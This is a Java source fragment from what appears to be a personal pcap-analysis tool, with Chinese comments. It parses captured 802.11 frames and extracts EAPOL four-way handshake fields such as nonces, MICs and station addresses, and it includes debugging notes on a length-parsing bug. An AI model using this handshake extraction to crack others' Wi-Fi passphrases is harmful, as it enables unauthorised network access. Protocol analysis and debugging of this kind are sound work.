			eap_key_length_2bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_length_begin_position_2byte,
					eap_key_length_end_position_2byte);

			int eap_replay_counter_begin_position_8byte = eap_key_length_end_position_2byte + 1;
			int eap_replay_counter_end_position_8byte = eap_replay_counter_begin_position_8byte + 8 - 1;
			eap_replay_counter_8bytes = beginIndex_endIndex_byteArr(eapolDataBytes,
					eap_replay_counter_begin_position_8byte, eap_replay_counter_end_position_8byte);

			int eap_wpa_key_nonce_begin_position_32byte = eap_replay_counter_end_position_8byte + 1;
			int eap_wpa_key_nonce_end_position_32byte = eap_wpa_key_nonce_begin_position_32byte + 32 - 1;
			eap_wpa_key_nonce_32bytes = beginIndex_endIndex_byteArr(eapolDataBytes,
					eap_wpa_key_nonce_begin_position_32byte, eap_wpa_key_nonce_end_position_32byte);

			int eap_key_iv_begin_position_16byte = eap_wpa_key_nonce_end_position_32byte + 1;
			int eap_key_iv_end_position_16byte = eap_key_iv_begin_position_16byte + 16 - 1;
			eap_key_iv_16bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_iv_begin_position_16byte,
					eap_key_iv_end_position_16byte);

			int eap_key_rsc_begin_position_8byte = eap_key_iv_end_position_16byte + 1;
			int eap_key_rsc_end_position_8byte = eap_key_rsc_begin_position_8byte + 8 - 1;
			eap_key_rsc_8bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_rsc_begin_position_8byte,
					eap_key_rsc_end_position_8byte);

			int eap_key_id_begin_position_8byte = eap_key_rsc_end_position_8byte + 1;
			int eap_key_id_end_position_8byte = eap_key_id_begin_position_8byte + 8 - 1;
			eap_key_id_8bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_id_begin_position_8byte,
					eap_key_id_end_position_8byte);

			int eap_key_mic_begin_position_16byte = eap_key_id_end_position_8byte + 1;
			int eap_key_mic_end_position_16byte = eap_key_mic_begin_position_16byte + 16 - 1;
			eap_key_mic_16bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_mic_begin_position_16byte,
					eap_key_mic_end_position_16byte);

			int eap_key_data_length_begin_position_2byte = eap_key_mic_end_position_16byte + 1;
			int eap_key_data_length_end_position_2byte = eap_key_data_length_begin_position_2byte + 2 - 1;
			eap_key_data_length_2bytes = beginIndex_endIndex_byteArr(eapolDataBytes,
					eap_key_data_length_begin_position_2byte, eap_key_data_length_end_position_2byte);

			eap_key_data_length_int = merge2ByteToInt(eap_key_data_length_2bytes[0], eap_key_data_length_2bytes[1]);

			if (eap_key_data_length_int > 0) {

				int eap_key_data_begin_position_bytes = eap_key_data_length_end_position_2byte + 1;
				int eap_key_data_end_position_bytes = eap_key_data_begin_position_bytes + eap_key_data_length_int - 1;
				eap_key_data_bytes = beginIndex_endIndex_byteArr(eapolDataBytes, eap_key_data_begin_position_bytes,
						eap_key_data_end_position_bytes);

			}

			// 可以 通过 Key-MIC=0 Secure=0 来判断
			// 第一个 Key-MIC=0 Secure=0
			// 第二个 Key-MIC=1 Secure=0
			// 第三个 Key-MIC=0 Secure=1
			// 第四个 Key-MIC=1 Secure=1
			//
			// AP ---> STA 第一个 isWifiReceive=true Key-Type-Pairwise=1 Key-ACK=1 Key-MIC=0
			// Install-Set=0 Secure=0
			// STA ---> AP 第二个 isWifiReceive=false Key-Type-Pairwise=1 Key-ACK=0 Key-MIC=1
			// Install-Set=0 Secure=0
			// AP ---> STA 第三个 isWifiReceive=true Key-Type-Pairwise=1 Key-ACK=1 Key-MIC=0
			// Install-Set=1 Secure=1
			// STA ---> AP 第二个 isWifiReceive=false Key-Type-Pairwise=1 Key-ACK=0 Key-MIC=1
			// Install-Set=0 Secure=1

		}

		@Override
		byte[] getEAPOL_WPA_Key_Nonce_Bytes() {
			return eap_wpa_key_nonce_32bytes;
		}

		@Override
		byte[] getEAPOL_WPA_MIC_Bytes() {
			return eap_key_mic_16bytes;
		}

		@Override
		byte[] getEAPOL_8021X_Authentication_Bytes() {
			return wifi_eapol_all_data_bytes;
		}

		@Override
		byte[] getFrame_Receiver_Address() {
			return wifi_ra_6bytes;
		}

		@Override
		byte[] getFrame_Transmitter_Address() {
			return wifi_ta_6bytes;
		}

		@Override
			// 是否是 STA 接受到的 帧 (即 AP 发送的帧数据)
		boolean is_receive_for_sta() {
			return wifi_is_receive_farme;
		}

		@Override
		String getFrame_TimeStamp_Desc() {
			return timestamp_str;
		}

		// 可以 通过 Key-MIC=0 Secure=0 来判断
		// 第一个 Key-MIC=0 Secure=0
		// 第二个 Key-MIC=1 Secure=0
		// 第三个 Key-MIC=1 Secure=1 Encrypted_Data=1
		// 第四个 Key-MIC=1 Secure=1 Encrypted_Data=0
		@Override
		int getEAPOL_Handshake_Message_Number() {
			if (!isEAPOL()) { // 非 EAPOL 的 返回 0
//				System.out.println("非 EAPOL 帧   第几次握手返回 0  ");
				return 0;
			}
//			...1 .... .... .... = Encrypted Key Data: Set
			if (eap_key_info_2bytes == null || eap_key_info_2bytes.length != 2) {
//				System.out.println(" EAPOL 帧  但 eap_info_2bytes 字节数组为空   第几次握手返回 0  ");
				return 0;
			}

			boolean Bit_Key_MIC_Flag = ((eap_key_info_2bytes[0] & 0x01) == 0x01);

			boolean Bit_Key_Secure_Flag = ((eap_key_info_2bytes[0] & 0x02) == 0x02);

			boolean Bit_Encrypted_Data_Flag = ((eap_key_info_2bytes[0] & 0x10) == 0x10);

			if (!Bit_Key_MIC_Flag && !Bit_Key_Secure_Flag) {
				return 1;
			}

			if (Bit_Key_MIC_Flag && !Bit_Key_Secure_Flag) {
				return 2;
			}

			if (Bit_Key_MIC_Flag && Bit_Key_Secure_Flag && Bit_Encrypted_Data_Flag) {
				return 3;
			}

			if (Bit_Key_MIC_Flag && Bit_Key_Secure_Flag && !Bit_Encrypted_Data_Flag) {
				return 4;
			}

			return 0;
		}

		boolean isEAPOL() {
			if ("888e".equals(wifi_logical_link_type_2bytes_hexstr) && wifi_8021x_auth_type_int == 3) {

				return true;
			}
			return false;
		}

		void parser_WifiFrame_with_type_subtype(int wifi_during_end_position_2bytes) {

			if (wifi_type_int == 0) { // 管理帧

				switch (wifi_subtype_int) {

					case 0:
// Association Request 关联请求帧	管理帧 wlan.fc.type == 0	wlan.fc.subtype == 0x00

						break;

					case 1:
// Association Response 关联响应帧	管理帧 wlan.fc.type == 0	wlan.fc.subtype == 0x01

						break;

					case 2:
//
						break;

					case 3:
//
						break;

					case 4:
//
						break;

					case 5:
//
						break;

					case 8: // wlan.fc.type == 0 && wlan.fc.subtype == 0x08 beacon 帧
//
						type0_sub8_80211_beacon_parser(wifi_during_end_position_2bytes); // beacon 帧 解析

						break;

					case 10:
//
						break;

					case 11:
//
						break;

					case 12:
//
						break;

					case 13:
//
						break;
					default:
						System.out.println("没有找到合适的 对应的解析类型 wifi_type_int=" + wifi_type_int + "  wifi_subtype_int="
								+ wifi_subtype_int);

				}

			} else if (wifi_type_int == 1) { // 控制帧

				switch (wifi_subtype_int) {

					case 0:

						break;

					case 1:

						break;

					case 2:
//
						break;

					case 3:
//
						break;

					case 4:
//
						break;

					case 5:
//
						break;

					case 8:
//
						break;

					case 10:
//
						break;

					case 11:
//
						break;

					case 12:
//
						break;

					case 13:
//
						break;
					default:
						System.out.println("没有找到合适的 对应的解析类型 wifi_type_int=" + wifi_type_int + "  wifi_subtype_int="
								+ wifi_subtype_int);

				}

			} else if (wifi_type_int == 2) { // 数据帧

				switch (wifi_subtype_int) {

					case 0:

						break;

					case 1:

						break;

					case 2:
//
						break;

					case 3:
//
						break;

					case 4:
//
						break;

					case 5:
//
						break;

					case 8: // type2_sub8_qosdata_parser();
						// wlan.fc.subtype == 0x08 && wlan.fc.type == 2
//  1.有 Protected-Data-Flag=1 的 Qos Data 帧

//  Protected-Data-Flag=0       Logic-Link-Control-8字节
//  2.有  的 EAPOL帧   802.1X Authentication type = 3  【802.1X Authentication  verison=2 auth-type=3 】
//  3.有  EAP 帧 【802.1X Authentication  verison=1 auth-type=0 】 Logic-Link-Control 的 Type-是 0x888e【 802.1X Authentication 】
//	4.有 TLSv1.2 帧 	Logic-Link-Control 的 Type-是 0x0800【 TCP 】	  没有 	802.1X Authentication 区块
//  5. 有 Qos-Data 类型的 TCP帧? 	Logic-Link-Control 的 Type-是 0x0800【 TCP 】

// arp  dns  也都是 可能是 qos_data

						if (wifi_is_protected) { // 带有数据的 Qos Data 类型

							type2_sub8_80211_qosdata_parser(wifi_during_end_position_2bytes);
						} else {

							type2_sub8_eapol_eap_tlvs_tcp_key_parser(wifi_during_end_position_2bytes);
						}

						break;

					case 10:
//
						break;

					case 11:
//
						break;

					case 12:
//
						break;

					case 13:
//
						break;
					default:
						System.out.println("没有找到合适的 对应的解析类型 wifi_type_int=" + wifi_type_int + "  wifi_subtype_int="
								+ wifi_subtype_int);

				}

			}

		}

		Wifi_Frame_Struct_00000006(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
								   int beginInFile, int endInFile) {
			super(block_type_bytes, block_head_length_bytes, all_frame_bytes, beginInFile, endInFile);
			// TODO Auto-generated constructor stub
		}

		Wifi_Frame_Struct_00000006() {
			init_prop();
		}

	}

	class Wifi_Frame_Struct_0A0D0D0A extends Wifi_Frame_Base_Struct {

		Wifi_Frame_Struct_0A0D0D0A(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
								   int beginInFile, int endInFile) {
			super(block_type_bytes, block_head_length_bytes, all_frame_bytes, beginInFile, endInFile);
			// TODO Auto-generated constructor stub
		}

		Wifi_Frame_Struct_0A0D0D0A() {

		}

		void parse_wifi_frame(byte[] all_frame) {

		}

	}

	class Wifi_Frame_Base_Struct extends Wifi_Frame_AbsCommon_Struct {

		Wifi_Frame_Base_Struct(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
							   int beginInFile, int endInFile) {
			super(block_type_bytes, block_head_length_bytes, all_frame_bytes, beginInFile, endInFile);
		}

		Wifi_Frame_Base_Struct() {
			super();
		}

		Wifi_Frame_AbsCommon_Struct getMatch_Wifi_Frame(String block_type_str) {
			switch (block_type_str) {

				case "00000001":

					return new Wifi_Frame_Struct_00000001();

				case "00000005":

					return new Wifi_Frame_Struct_00000005();

				case "00000006":

					return new Wifi_Frame_Struct_00000006();

				case "0A0D0D0A":

					return new Wifi_Frame_Struct_0A0D0D0A();

				default:
					break;
			}

			System.out.println("没有选中 block_type_str = " + block_type_str + "的解析类!  ");
			return null;

		}

		void parse_wifi_frame(byte[] all_frame) {
			System.out.println("method parse_wifi_frame call in " + getClass().getSimpleName());

		}

		// 两头 都包含
		byte[] beginIndex_endIndex_byteArr(byte[] all_frame_byte, int beginIndex, int endIndex) {
			int cur_byte_length = endIndex - beginIndex + 1;
			if (cur_byte_length <= 0) {
				System.out.println("package_number="+package_number+"  当前查询 子byte数组 	beginIndex=" + beginIndex + "  endIndex=" + endIndex
						+ "  cur_byte_length=" + cur_byte_length + "异常  请检查!");
				return null;
			}

			byte[] matchByte = new byte[cur_byte_length];

			if (all_frame_byte == null || all_frame_byte.length < cur_byte_length) {

				System.out.println("当前查询 子byte数组 	beginIndex=" + beginIndex + "  endIndex=" + endIndex
						+ "  cur_byte_length=" + cur_byte_length + "frame_bytes 为 空  请检查!");
				return null;
			}

			if (endIndex >= all_frame_byte.length || beginIndex < 0) {

				System.out.println(
						"当前查询A 子byte数组 	beginIndex=" + beginIndex + "  endIndex=" + endIndex + "  cur_byte_length="
								+ cur_byte_length + "   all_frame_byte.length=" + all_frame_byte.length + " 异常  请检查!");
				return null;
			}

			for (int i = beginIndex; i <= endIndex; i++) {
				int matchIndex = i - beginIndex;
				matchByte[matchIndex] = all_frame_byte[i];
			}

			return matchByte;

		}

		//			  Options-Length=19   那么对齐长度 【(19%4 == 0) ? 19:(Math.flow(19/4)*4)】=20个字节
//			  Options-Length=45   那么对齐长度 【(45%4 == 0) ? 45:(Math.flow(45/4)*4)】=48个字节
		int getRealLength_From_AvaliableLength(int avaliableLength) {

			int realLength = avaliableLength;
			while (realLength % 4 != 0) {
				realLength++;
			}

			return realLength;

		}

		int getEAPOL_Handshake_Message_Number() {
			return 0;
		}

		String getFrame_TimeStamp_Desc() {
			return "";
		}

		byte[] getEAPOL_WPA_Key_Nonce_Bytes() {
			return null;
		}

		byte[] getEAPOL_WPA_MIC_Bytes() {
			return null;
		}

		byte[] getEAPOL_8021X_Authentication_Bytes() {
			return null;
		}

		byte[] getFrame_Receiver_Address() {
			return null;
		}

		byte[] getFrame_Transmitter_Address() {
			return null;
		}

		byte[] get_wifi_bssid_Bytes() {
			return null;
		}

		// 是否是 STA 接受到的 帧 (即 AP 发送的帧数据)
		boolean is_receive_for_sta() {
			return false;
		}

		String getBeacon_Identify() {

			return null;
		}

		boolean is_beacon_frame() {

			return false;
		}

		byte[] get_wifi_ssid_Bytes() {
			return null;
		}

		String get_wifi_ssid() {
			return null;
		}

	}

	abstract class Wifi_Frame_AbsCommon_Struct {
		byte[] frame_bytes; // 当前帧的所有的字节
		String frame_bytes_hexstr;

		byte[] block_type_4bytes; // Block Type = 0x0A0D0D0A Block Type=0x00000001 Block Type=0x0000060 Block
		// Type=0x000005
		String block_type_str;

		byte[] head_block_total_length_4bytes; // 头部的 长度
		int head_block_total_length;
		String head_block_total_length_4bytes_hexstr;

		byte[] tail_block_total_length_4bytes; // 尾部的 长度
		int tail_block_total_length;
		String tail_block_total_length_4bytes_hexstr;

		int frame_length;

		int frame_begin_index;

		int frame_end_index;

		int package_number; // 包序列 第一个 包 第二个包

		Wifi_Frame_AbsCommon_Struct() {

		}

		Wifi_Frame_AbsCommon_Struct(byte[] block_type_bytes, byte[] block_head_length_bytes, byte[] all_frame_bytes,
									int beginInFile, int endInFile) {

			block_type_4bytes = block_type_bytes;

			head_block_total_length_4bytes = block_head_length_bytes;

			frame_bytes = all_frame_bytes;
			frame_length = all_frame_bytes.length;
			frame_begin_index = beginInFile;
			frame_end_index = endInFile;
			block_type_str = DigitalTransUtils.byte2hex(block_type_4bytes);
			frame_bytes_hexstr = DigitalTransUtils.byte2hex(frame_bytes);
		}

		@Override
		public String toString() {
			return getClass().getSimpleName() + " " + package_number + "[frame_bytes=" + Arrays.toString(frame_bytes)
					+ ", frame_bytes_hexstr=" + frame_bytes_hexstr + ", block_type_4bytes="
					+ Arrays.toString(block_type_4bytes) + ", block_type_str=" + block_type_str
					+ ", head_block_total_length_4bytes=" + Arrays.toString(head_block_total_length_4bytes)
					+ ", head_block_total_length=" + head_block_total_length
					+ ", head_block_total_length_4bytes_hexstr=" + head_block_total_length_4bytes_hexstr
					+ ", tail_block_total_length_4bytes=" + Arrays.toString(tail_block_total_length_4bytes)
					+ ", tail_block_total_length=" + tail_block_total_length
					+ ", tail_block_total_length_4bytes_hexstr=" + tail_block_total_length_4bytes_hexstr
					+ ", frame_length=" + frame_length + ", frame_begin_index=" + frame_begin_index
					+ ", frame_end_index=" + frame_end_index + ", package_number=" + package_number + "]";
		}

		public String getBlock_type_str() {
			return block_type_str;
		}

		public void setBlock_type_str(String block_type_str) {
			this.block_type_str = block_type_str;
		}

		abstract int getRealLength_From_AvaliableLength(int avaliableLength);

		abstract byte[] beginIndex_endIndex_byteArr(byte[] all_frame_byte, int beginIndex, int endIndex);

		abstract Wifi_Frame_AbsCommon_Struct getMatch_Wifi_Frame(String block_type_str);

		abstract void parse_wifi_frame(byte[] all_frame);

		abstract int getEAPOL_Handshake_Message_Number();

		abstract String getFrame_TimeStamp_Desc();

		abstract byte[] getEAPOL_WPA_Key_Nonce_Bytes();

		abstract byte[] getEAPOL_WPA_MIC_Bytes();

		abstract byte[] getEAPOL_8021X_Authentication_Bytes();

		abstract byte[] get_wifi_bssid_Bytes();

		abstract byte[] get_wifi_ssid_Bytes();

		abstract String get_wifi_ssid();

		abstract byte[] getFrame_Receiver_Address();

		abstract byte[] getFrame_Transmitter_Address();

		abstract String getBeacon_Identify();

		// 是否是 beacon 帧
		abstract boolean is_beacon_frame();

		abstract boolean is_receive_for_sta(); // 是否是 STA 接受到的 帧 (即 AP 发送的帧数据)

	}

	// 对 .pcap文件解析 对 tcpdump 包的分析
	class PcaP_TcpDump_Frame_Analysis_Rule_51 extends Basic_Rule {

		static final int GLOBAL_HEADER_LENGTH = 24;
		static final int PACKET_HEADER_LENGTH = 16;
		long fileSize;
		InputStream input;
		ByteOrder bo = ByteOrder.BIG_ENDIAN;
		volatile ByteReader reader;
		volatile int offset;

		PcaP_TcpDump_Frame_Analysis_Rule_51() {
			super(51, false);
		}

		@Override
		String simpleDesc() {
			return " 对 .pcap  tcpdump抓取的 wifi帧包 文件解析  对wifi包的分析  ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			// TODO Auto-generated method stub

			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				String fileName = fileItem.getName().toLowerCase();
				if (!fileName.endsWith(".pcap")) {
					System.out.println("当前文件不是 .pcapng Wifi帧交互类型 无法解析  请检查!!");
					return null;
				}

				try {
					PcapFileParser(fileItem);
					parse();

				} catch (Exception e) {
					System.out.println("解析 pcapng 文件[" + fileItem.getAbsolutePath() + "] 出现异常  异常结束!! ");
				}

				System.out.println("═════════ pcapng 文件[" + fileItem.getAbsolutePath() + "] 解析结束" + "═════════");
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		public boolean hasMoreData() {
			return offset < fileSize;
		}

		public void parse() throws IOException {

			int step_index = 1;
			while (hasMoreData()) {
				synchronized (this) {
					byte[] packetHeaderBuffer = new byte[16];
					int preOffSet = offset;
					System.out.println("step[" + step_index + "]_0  preOffSet=" + preOffSet + "   offset=" + offset);

					ByteBuffer buffer = reader.read(PACKET_HEADER_LENGTH);

					System.out.println("step[" + step_index + "]_1  preOffSet=" + preOffSet + "   offset=" + offset);
					PacketHeader packetHeader = parsePacketHeader(buffer.array(), step_index, preOffSet);

					System.out.println("step[" + step_index + "]_3  preOffSet=" + preOffSet + "   offset=" + offset);

					input.skip(packetHeader.getCapLen());
					offset += (packetHeader.getCapLen());
					System.out.println("step[" + step_index + "]_4  preOffSet=" + preOffSet + "   offset=" + offset);

					System.out.println("step[" + step_index + "]_5  " + "preOffSet=" + preOffSet + "   offset = "
							+ offset + "   CapLen=" + packetHeader.getCapLen() + "  fileSize=" + fileSize);
					System.out.println("step[" + step_index + "]_6" + packetHeader);
					step_index++;
				}
			}

		}

		// offset 还没 读取到 9232 的值 就被 加了 一个 16个 HeadData_Length 的长度
		// preOffSet=4836 offset = 9232 CapLen=4396 fileSize=232773
		// 0000 0000 0000 0000 0000 0000 1010 0100
		// 0000 0000 0000 0000 1010 0100 1110 1010
		// 0000 0000 1010 0100 1110 1010 1110 0011
		// 1010 0100 1110 1010 1110 0011 0101 1101
		// ApreOffset=9248 Aoffset=9248 capLen=-1528110243 capA=-1528110243
		// len=343119073 capLenBuffer=5DE3EAA4
		// dataHeaderBuffer=FA6A373C9C71AB445DE3EAA4E1947314

		public PacketHeader parsePacketHeader(byte[] dataHeaderBuffer, int step_index, int preOffset) {
			byte[] timeSBuffer = Arrays.copyOfRange(dataHeaderBuffer, 0, 4);
			byte[] timeMsBuffer = Arrays.copyOfRange(dataHeaderBuffer, 4, 8);
			byte[] capLenBuffer = Arrays.copyOfRange(dataHeaderBuffer, 8, 12);
			byte[] lenBuffer = Arrays.copyOfRange(dataHeaderBuffer, 12, 16);

			PacketHeader packetHeader = new PacketHeader();

			String timeS = DateUtil.dateToString(ByteUtil.bytesToInt(timeSBuffer, bo) * 1000L);
			int timeMs = ByteUtil.bytesToInt(timeMsBuffer, bo);
			int capLen = ByteUtil.bytesToInt(capLenBuffer, bo);
			int len = ByteUtil.bytesToInt(lenBuffer, bo);

			int capA = bytesToInt(capLenBuffer);

			// CapLength 读错
			// offsetA=9248 capLen=-1528110243 capA=-1528110243 capLenBuffer=5DE3EAA4
			// len=343119073
			// PacketHeader{timeS=2002-01-06 05:07:06, timeMs=1152086428,
			// capLen=-1528110243, len=343119073}
			// offset = -1528100995 CapLen=-1528110243 fileSize=232773

			System.out.println("step[" + step_index + "]_2_parsePacketHeader  ApreOffset=" + preOffset + "  Aoffset="
					+ offset + "   capLen=" + capLen + "   capA=" + capA + "   len=" + len + "     capLenBuffer="
					+ toHexString(capLenBuffer) + "     dataHeaderBuffer=" + toHexString(dataHeaderBuffer));

			packetHeader.setTimeS(timeS);
			packetHeader.setTimeMs(timeMs);
			packetHeader.setCapLen(capLen);
			packetHeader.setLen(len);

			return packetHeader;
		}

		public void PcapFileParser(File pcapFile) throws Exception {
			fileSize = pcapFile.length();
			System.out.println("文件长度:" + fileSize);
			input = new BufferedInputStream(new FileInputStream(pcapFile));

			byte[] globalHeaderBuffer = new byte[GLOBAL_HEADER_LENGTH];
			if (input.read(globalHeaderBuffer) != GLOBAL_HEADER_LENGTH) {
				System.out.println("The Pcap file is broken!");
				return;
			}

			byte[] magicNum = Arrays.copyOfRange(globalHeaderBuffer, 0, 4);

			if (!DigitalTransUtils.byte2hex(magicNum, false).equalsIgnoreCase("A1B2C3D4")) {
				bo = ByteOrder.LITTLE_ENDIAN;
			}
			reader = new ByteReader(bo);
			offset = 24;

			// 解析 Global Header
			GlobalHeader globalHeader = parseGlobalHeader(globalHeaderBuffer);
			System.out.println(globalHeader);
		}

		/**
		 * 解析Global Header
		 */
		private GlobalHeader parseGlobalHeader(byte[] globalHeaderBuffer) {
			GlobalHeader globalHeader = new GlobalHeader();

			byte[] magicBuffer = Arrays.copyOfRange(globalHeaderBuffer, 0, 4);
			byte[] linkTypeBuffer = Arrays.copyOfRange(globalHeaderBuffer, 20, 24);

			globalHeader.setMagicNum(DigitalTransUtils.byte2hex(magicBuffer, false));
			globalHeader.setLinkType(ByteUtil.bytesToInt(linkTypeBuffer, bo));

			return globalHeader;
		}

		public int bytesToInt(byte[] a) {
			int ans = 0;
			for (int i = 0; i < 4; i++) {
				ans <<= 8;
				ans |= (a[3 - i] & 0xff);
				/*
				 * 这种写法会看起来更加清楚一些： int tmp=a[3-i]; tmp=tmp&0x000000ff; ans|=tmp;
				 */
//	            intPrint(ans);
			}
			return ans;
		}

		public void intPrint(int a) {// 将 int 按位从左到右打印
			int count = 0;
			for (int i = 31; i >= 0; i--) {
				System.out.print((a >> i) & 1);
				count++;
				if (count == 4) {// 每四位为一组，用空格分开
					System.out.print(" ");
					count = 0;
				}
			}
			System.out.println();
		}

		public class ByteReader {
			ByteOrder bo = ByteOrder.BIG_ENDIAN;

			public ByteReader(ByteOrder bo) {
				this.bo = bo;
			}

			/**
			 * Reads {@code length} bytes from the file at the input stream's current
			 * position.
			 *
			 * @param length the amount of bytes to read
			 * @return a {@link ByteBuffer} that holds the underlying byte array of the data
			 *         that was read.
			 * @throws IOException if there was an error while reading from the file
			 */
			public ByteBuffer read(int length) throws IOException {
				return read(length, bo);
			}

			/**
			 * Reads {@code length} bytes from the file at the input stream's current
			 * position.
			 *
			 * @param length the amount of bytes to read
			 * @param order  the endianness of the resulting {@link ByteBuffer}
			 * @return a {@link ByteBuffer} that holds the underlying byte array of the data
			 *         that was read.
			 * @throws IOException if there was an error while reading from the file
			 */
			public ByteBuffer read(int length, ByteOrder order) {

				ByteBuffer buffer = null;

				byte[] data = new byte[length];
				try {

//		            byte[] data =    new byte[] { (byte)0x00, 0x00, (byte)0x00, (byte)0x00,
//		            		(byte)0x00, 0x00, (byte)0x00, (byte)0x00,
//		            		(byte)0x00, 0x00, (byte)0x00, (byte)0x00,
//		            		(byte)0x00, 0x00, (byte)0x00, (byte)0x00,
//		             };

					int avaliableNum = input.available();
					int curPosition = (int) (fileSize - avaliableNum);
					int curPosition_offset_diff = offset - curPosition;
					System.out.println("avaliableNum = " + avaliableNum + "  curPosition=" + curPosition
							+ "  curPosition_offset_diff=" + curPosition_offset_diff);

//step[7]_0  preOffSet=9232   offset=9232
//avaliableNum = 224581  curPosition=8192  curPosition_offset_diff=1040
//step[7]_1  preOffSet=9232   offset=9248
//step[7]_2_parsePacketHeader  ApreOffset=9232  Aoffset=9248   capLen=1508   capA=1508   len=1508     capLenBuffer=E4050000     dataHeaderBuffer=3B4984607FA40200E4050000E4050000
//step[7]_3  preOffSet=9232   offset=9248
//step[7]_4  preOffSet=9232   offset=10756
//step[7]_5  preOffSet=9232   offset = 10756   CapLen=1508  fileSize=232773

					// offset为 9232 读取到 但curPosition 却是8192 意味着当前读取 只能从8192开始 需要继续跳过 diff=1040个字节才能从
					// 9232 开始
					if (curPosition_offset_diff > 0) {
						input.skip(curPosition_offset_diff);
					}

					input.read(data, 0, length);

					offset += length;
					buffer = ByteBuffer.wrap(data);
					buffer.order(order);

				} catch (Exception e) {
					System.out.println("读取read 方法 发生异常! e=" + e);
				}

				return buffer;
			}

		}

	}

	// zukgit
	public static class DateUtil {

		// -MM-dd HH:mm:ss
		public static String dateToString(long timeStamp) {
			SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String now = f.format(timeStamp);
			return now;

		}

		static String getTimeStampStr_YYYYMMDDHHMMSS_FORMAT(Long time) {
			SimpleDateFormat f = new SimpleDateFormat("yyyyMMddHHmmss");
			String now = f.format(time);
			return now;
		}

	}

	public static class DigitalTransUtils {
		/**
		 * 字节数组转换为十六进制字符串
		 *
		 * @param b byte[] 需要转换的字节数组
		 * @return String 十六进制字符串
		 */

		// 【block_type_bytes_hexstr = 0A0D0D0A】
		// block_head_length_bytes_hexstr=【6C000000】 ByteOrder.BIG_ENDIAN 大端对齐了 实际 要小端对齐
		// 【block_type_bytes_hexstr = A0D0D0A0】
		// block_head_length_bytes_hexstr=【000000C6】 尼马 还是 错 要 6C才对 // new
		// StringBuffer(s).reverse().toString(); 不行

		// 【block_type_bytes_hexstr = 0A0D0D0A】
		// block_head_length_bytes_hexstr=【0000006C】 终于 好了
		public static final String byte2hex(byte[] b, boolean isLittle_end) { // 小端对齐-true 大端对齐-false
			if (b == null) {
				throw new IllegalArgumentException("Argument b ( byte array ) is null! ");
			}
			String hs = "";
			String stmp = "";
			if (isLittle_end) {
				for (int n = b.length - 1; n >= 0; n--) {
					stmp = Integer.toHexString(b[n] & 0xff);
					if (stmp.length() == 1) {
						hs = hs + "0" + stmp;
					} else {
						hs = hs + stmp;
					}
				}

			} else {
				for (int n = 0; n < b.length; n++) {
					stmp = Integer.toHexString(b[n] & 0xff);
					if (stmp.length() == 1) {
						hs = hs + "0" + stmp;
					} else {
						hs = hs + stmp;
					}
				}

			}

			return hs.toUpperCase();
		}

		public static final String byte2hex(byte[] b) { // 小端对齐-true 大端对齐-false
			if (b == null) {
				throw new IllegalArgumentException("Argument b ( byte array ) is null! ");
			}
			String hs = "";
			String stmp = "";

			for (int n = 0; n < b.length; n++) {
				stmp = Integer.toHexString(b[n] & 0xff);
				if (stmp.length() == 1) {
					hs = hs + "0" + stmp;
				} else {
					hs = hs + stmp;
				}
			}

			return hs.toUpperCase();
		}

		/**
		 * 字节数组转为普通字符串（ASCII对应的字符）
		 *
		 * @param bytearray byte[]
		 * @return String
		 */
		public static String bytetoString(byte[] bytearray) {
			String result = "";
			char temp;

			int length = bytearray.length;
			for (int i = 0; i < length; i++) {
				temp = (char) bytearray[i];
				result += temp;
			}
			return result;
		}
	}

	public static class GlobalHeader {

		public static final int LINK_TYPE_ETHERNET = 1;

		/**
		 * 十六制的magicNum,通常是 A1B2C3D4
		 */
		public String magicNum;
		/**
		 * 链路层报头类型,通常是1，表示以太网
		 */
		public int linkType;

		public GlobalHeader() {
		}

		public String getMagicNum() {
			return magicNum;
		}

		public void setMagicNum(String magicNum) {
			this.magicNum = magicNum;
		}

		public int getLinkType() {
			return linkType;
		}

		public void setLinkType(int linkType) {
			this.linkType = linkType;
		}

		@Override
		public String toString() {
			return "GlobalHeader{" + "magicNum=" + magicNum + ", linkType=" + linkType + '}';
		}
	}

	public static class PacketHeader {

		/**
		 *
		 * 时间戳 高位（秒）：记录数据包抓获的时间, 转化为 yyyy-MM-dd HH:mm:ss格式的日期时间 记录方式是从格林尼治时间的1970年1月1日
		 * 00:00:00 到抓包时经过的秒数（4个字节）
		 *
		 */
		public String timeS;
		/**
		 * 时间戳 低位（微秒）：抓取数据包时的微秒值（4个字节）
		 */
		public int timeMs;
		/**
		 * 数据包长度：标识所抓获的数据包保存在 pcap 文件中的实际长度，以字节为单位（4个字节）
		 */
		public int capLen;
		/**
		 * 数据包实际长度： 所抓获的数据包的真实长度（4个字节）
		 */
		public int len;

		public PacketHeader() {
		}

		@Override
		public String toString() {
			return "PacketHeader{" + "timeS=" + timeS + ", timeMs=" + timeMs + ", capLen=" + capLen + ", len=" + len
					+ '}';
		}

		public int getTimeMs() {
			return timeMs;
		}

		public void setTimeMs(int timeMs) {
			this.timeMs = timeMs;
		}

		public int getCapLen() {
			return capLen;
		}

		public void setCapLen(int capLen) {
			this.capLen = capLen;
		}

		public int getLen() {
			return len;
		}

		public void setLen(int len) {
			this.len = len;
		}

		public String getTimeS() {

			return timeS;
		}

		public void setTimeS(String timeS) {
			this.timeS = timeS;
		}

	}

	// SELinux : avc: denied { find } for pid=27266 uid=10108
	// name=motorola.hardware.sarwifi.IMtkWifi/default
	// scontext=u:r:platform_app:s0:c512,c768
	// tcontext=u:object_r:default_android_service:s0 tclass=service_manager
	// permissive=0
	// SELinux : avc: denied { find } for pid=6433 uid=90008 name=content_capture
	// scontext=u:r:isolated_app:s0:c512,c768
	// tcontext=u:object_r:content_capture_service:s0 tclass=service_manager
	// permissive=0
